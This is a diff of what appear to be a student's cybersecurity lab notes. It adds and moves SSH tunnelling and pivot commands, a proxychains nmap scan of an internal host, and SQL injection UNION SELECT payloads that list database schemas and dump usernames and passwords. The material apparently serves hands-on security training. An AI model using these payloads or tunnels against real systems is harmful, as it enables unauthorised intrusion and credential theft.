@@ -15,13 +15,14 @@ Win.Ops: 10.50.29.185
 ## SSH
 ssh student@10.50.28.189 -D 9050
 ssh student@10.50.28.189 -L1111:192.168.28.111:8080
+proxychains nmap -Pn -T4 -n -p1-10000 192.168.128.111
 
+## NEW SSH
 ssh -MS /tmp/jump student@10.50.28.189 
 ssh -S /tmp/jump dummy
 ssh -S /tmp/jump -O forward -D 9050 dummy  --- DYNO port 
 ssh -S /tmp/jump -O cancel -D 9050 dummy  --- DYNO port 
 
-proxychains nmap -Pn -T4 -n -p1-10000 192.168.128.111
 
 ssh -S /tmp/jump -O forward -L1111:10.100.28.40:80 DUMB
 ssh -S /tmp/jump -O forward -L2222:192.168.28.111:8080 DUMB
@@ -175,7 +176,7 @@ Audi'UNION SELECT tireid,2,name,size,cost FROM session.Tires;#
 ?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
 ?Selection=2 UNION SELECT username,studentID,passwd FROM session.userinfo;#
 
-
+?category=1 UNION SELECT username,password,permission FROM sqlinjection.members;#
 
 
 
